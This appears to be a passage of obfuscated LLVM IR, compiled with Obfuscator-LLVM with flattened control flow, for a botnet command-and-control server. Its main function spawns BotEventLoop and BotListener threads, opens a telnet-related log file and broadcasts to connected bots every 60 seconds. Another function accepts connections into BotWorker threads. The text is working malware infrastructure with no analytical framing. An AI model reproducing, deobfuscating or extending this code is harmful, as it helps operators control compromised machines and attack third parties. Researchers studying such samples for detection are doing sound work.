  store i32 0, i32* %19, align 4
  %20 = load i32, i32* %3, align 4
  %21 = trunc i32 %20 to i16
  %22 = call zeroext i16 @htons(i16 zeroext %21) #9
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %4, align 4
  %25 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %26 = call i32 @bind(i32 %24, %struct.sockaddr* %25, i32 16) #7
  %27 = icmp slt i32 %26, 0
  %28 = select i1 %27, i32 -1162485909, i32 -2036138248
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0))
  store i32 -2036138248, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %4, align 4
  %32 = call i32 @listen(i32 %31, i32 5) #7
  store i32 16, i32* %6, align 4
  store i32 -616624832, i32* %switchVar
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %4, align 4
  %35 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %36 = call i32 @accept(i32 %34, %struct.sockaddr* %35, i32* %6)
  store i32 %36, i32* %5, align 4
  %37 = load i32, i32* %5, align 4
  %38 = icmp slt i32 %37, 0
  %39 = select i1 %38, i32 1407752441, i32 -1780869310
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.80, i32 0, i32 0))
  store i32 -1780869310, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %5, align 4
  %43 = sext i32 %42 to i64
  %44 = inttoptr i64 %43 to i8*
  %45 = call i32 @pthread_create(i64* %9, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %44) #7
  store i32 -616624832, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i8*, i8** %2, align 8
  ret i8* %47

loopEnd:                                          ; preds = %41, %40, %33, %30, %29, %15, %14, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**, i8**) #0 {
  %.reg2mem2 = alloca i64*
  %.reg2mem = alloca i32
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %13 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #7
  %14 = load i32, i32* %5, align 4
  store i32 %14, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 1130600113, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1130600113, label %first
    i32 -1896434979, label %17
    i32 1352846912, label %23
    i32 -1775920760, label %40
    i32 -1954126235, label %41
    i32 728807454, label %47
    i32 -349515905, label %48
    i32 313836524, label %54
    i32 -1158261580, label %55
    i32 1780427256, label %60
    i32 549654401, label %61
    i32 1302245738, label %72
    i32 559333363, label %73
    i32 -1444862568, label %79
    i32 1061641681, label %84
    i32 -1172488026, label %90
    i32 -733995036, label %96
    i32 173038865, label %97
    i32 362915258, label %99
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %15 = icmp ne i32 %.reload, 4
  %16 = select i1 %15, i32 -1896434979, i32 1352846912
  store i32 %16, i32* %switchVar
  br label %loopEnd

; <label>:17:                                     ; preds = %loopEntry
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.81, i32 0, i32 0), i8* %21)
  call void @exit(i32 1) #10
  unreachable

; <label>:23:                                     ; preds = %loopEntry
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.83, i32 0, i32 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** @telFD, align 8
  %29 = load i8**, i8*** %6, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31) #8
  store i32 %32, i32* %9, align 4
  %33 = load i8**, i8*** %6, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @create_and_bind(i8* %35)
  store volatile i32 %36, i32* @listenFD, align 4
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = icmp eq i32 %37, -1
  %39 = select i1 %38, i32 -1775920760, i32 -1954126235
  store i32 %39, i32* %switchVar
  br label %loopEnd

; <label>:40:                                     ; preds = %loopEntry
  call void @abort() #10
  unreachable

; <label>:41:                                     ; preds = %loopEntry
  %42 = load volatile i32, i32* @listenFD, align 4
  %43 = call i32 @make_socket_non_blocking(i32 %42)
  store i32 %43, i32* %8, align 4
  %44 = load i32, i32* %8, align 4
  %45 = icmp eq i32 %44, -1
  %46 = select i1 %45, i32 728807454, i32 -349515905
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  call void @abort() #10
  unreachable

; <label>:48:                                     ; preds = %loopEntry
  %49 = load volatile i32, i32* @listenFD, align 4
  %50 = call i32 @listen(i32 %49, i32 128) #7
  store i32 %50, i32* %8, align 4
  %51 = load i32, i32* %8, align 4
  %52 = icmp eq i32 %51, -1
  %53 = select i1 %52, i32 313836524, i32 -1158261580
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:55:                                     ; preds = %loopEntry
  %56 = call i32 @epoll_create1(i32 0) #7
  store volatile i32 %56, i32* @epollFD, align 4
  %57 = load volatile i32, i32* @epollFD, align 4
  %58 = icmp eq i32 %57, -1
  %59 = select i1 %58, i32 1780427256, i32 549654401
  store i32 %59, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:61:                                     ; preds = %loopEntry
  %62 = load volatile i32, i32* @listenFD, align 4
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  store i32 %62, i32* %64, align 1
  %65 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %65, align 1
  %66 = load volatile i32, i32* @epollFD, align 4
  %67 = load volatile i32, i32* @listenFD, align 4
  %68 = call i32 @epoll_ctl(i32 %66, i32 1, i32 %67, %struct.epoll_event* %11) #7
  store i32 %68, i32* %8, align 4
  %69 = load i32, i32* %8, align 4
  %70 = icmp eq i32 %69, -1
  %71 = select i1 %70, i32 1302245738, i32 559333363
  store i32 %71, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0))
  call void @abort() #10
  unreachable

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i32, i32* %9, align 4
  %75 = add nsw i32 %74, 2
  %76 = zext i32 %75 to i64
  %77 = call i8* @llvm.stacksave()
  store i8* %77, i8** %12, align 8
  %78 = alloca i64, i64 %76, align 16
  store i64* %78, i64** %.reg2mem2
  store i32 -1444862568, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %9, align 4
  %81 = add nsw i32 %80, -1
  store i32 %81, i32* %9, align 4
  %82 = icmp ne i32 %80, 0
  %83 = select i1 %82, i32 1061641681, i32 -1172488026
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = load i32, i32* %9, align 4
  %86 = add nsw i32 %85, 1
  %87 = sext i32 %86 to i64
  %.reload4 = load volatile i64*, i64** %.reg2mem2
  %88 = getelementptr inbounds i64, i64* %.reload4, i64 %87
  %89 = call i32 @pthread_create(i64* %88, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #7
  store i32 -1444862568, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  %.reload3 = load volatile i64*, i64** %.reg2mem2
  %91 = getelementptr inbounds i64, i64* %.reload3, i64 0
  %92 = load i32, i32* %10, align 4
  %93 = sext i32 %92 to i64
  %94 = inttoptr i64 %93 to i8*
  %95 = call i32 @pthread_create(i64* %91, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %94) #7
  store i32 -733995036, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 173038865, i32* %switchVar
  br label %loopEnd

; <label>:97:                                     ; preds = %loopEntry
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0), i32 -1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.86, i32 0, i32 0))
  %98 = call i32 @sleep(i32 60)
  store i32 -733995036, i32* %switchVar
  br label %loopEnd

; <label>:99:                                     ; preds = %loopEntry
  %100 = load i32, i32* %4, align 4
  ret i32 %100

loopEnd:                                          ; preds = %97, %96, %90, %84, %79, %73, %61, %55, %48, %41, %23, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @create_and_bind(i8*) #0 {
  %.reg2mem = alloca i32
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 48, i32 8, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  store i32 %16, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 262742876, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 262742876, label %first
    i32 -912427043, label %19
    i32 1363310401, label %24
    i32 -925143800, label %26
    i32 260519832, label %30
    i32 2145102358, label %44
    i32 1119472344, label %45
    i32 -1558450748, label %51
    i32 1683292374, label %52
    i32 1275505157, label %64
    i32 -41902510, label %65
    i32 1605648860, label %68
    i32 437673186, label %72
    i32 -1391771680, label %76
    i32 2012362762, label %79
    i32 921035052, label %82
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %17 = icmp ne i32 %.reload, 0
  %18 = select i1 %17, i32 -912427043, i32 1363310401
  store i32 %18, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %21 = load i32, i32* %7, align 4
  %22 = call i8* @gai_strerror(i32 %21) #7
  %23 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %20, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.88, i32 0, i32 0), i8* %22)
  store i32 -1, i32* %2, align 4
  store i32 921035052, i32* %switchVar
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %25, %struct.addrinfo** %6, align 8
  store i32 -925143800, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %28 = icmp ne %struct.addrinfo* %27, null
  %29 = select i1 %28, i32 260519832, i32 437673186
  store i32 %29, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %32 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %31, i32 0, i32 1
  %33 = load i32, i32* %32, align 4
  %34 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %35 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %34, i32 0, i32 2
  %36 = load i32, i32* %35, align 8
  %37 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %38 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = call i32 @socket(i32 %33, i32 %36, i32 %39) #7
  store i32 %40, i32* %8, align 4
  %41 = load i32, i32* %8, align 4
  %42 = icmp eq i32 %41, -1
  %43 = select i1 %42, i32 2145102358, i32 1119472344
  store i32 %43, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  store i32 1605648860, i32* %switchVar
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  %46 = load i32, i32* %8, align 4
  %47 = bitcast i32* %9 to i8*
  %48 = call i32 @setsockopt(i32 %46, i32 1, i32 2, i8* %47, i32 4) #7
  %49 = icmp eq i32 %48, -1
  %50 = select i1 %49, i32 -1558450748, i32 1683292374
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i32 0, i32 0))
  store i32 1683292374, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %8, align 4
  %54 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %55 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %54, i32 0, i32 5
  %56 = load %struct.sockaddr*, %struct.sockaddr** %55, align 8
  %57 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %58 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %57, i32 0, i32 4
  %59 = load i32, i32* %58, align 8
  %60 = call i32 @bind(i32 %53, %struct.sockaddr* %56, i32 %59) #7
  store i32 %60, i32* %7, align 4
  %61 = load i32, i32* %7, align 4
  %62 = icmp eq i32 %61, 0
  %63 = select i1 %62, i32 1275505157, i32 -41902510
  store i32 %63, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 437673186, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %8, align 4
  %67 = call i32 @close(i32 %66)
  store i32 1605648860, i32* %switchVar
  br label %loopEnd

; <label>:68:                                     ; preds = %loopEntry
  %69 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %70 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %69, i32 0, i32 7
  %71 = load %struct.addrinfo*, %struct.addrinfo** %70, align 8
  store %struct.addrinfo* %71, %struct.addrinfo** %6, align 8
  store i32 -925143800, i32* %switchVar
  br label %loopEnd

; <label>:72:                                     ; preds = %loopEntry
  %73 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %74 = icmp eq %struct.addrinfo* %73, null
  %75 = select i1 %74, i32 -1391771680, i32 2012362762
  store i32 %75, i32* %switchVar
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %77 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %78 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %77, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.90, i32 0, i32 0))
  store i32 -1, i32* %2, align 4
  store i32 921035052, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* %80) #7
  %81 = load i32, i32* %8, align 4
  store i32 %81, i32* %2, align 4
  store i32 921035052, i32* %switchVar
  br label %loopEnd

; <label>:82:                                     ; preds = %loopEntry
  %83 = load i32, i32* %2, align 4
  ret i32 %83

loopEnd:                                          ; preds = %79, %76, %72, %68, %65, %64, %52, %51, %45, %44, %30, %26, %24, %19, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @fcntl(i32, i32, ...) #1

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
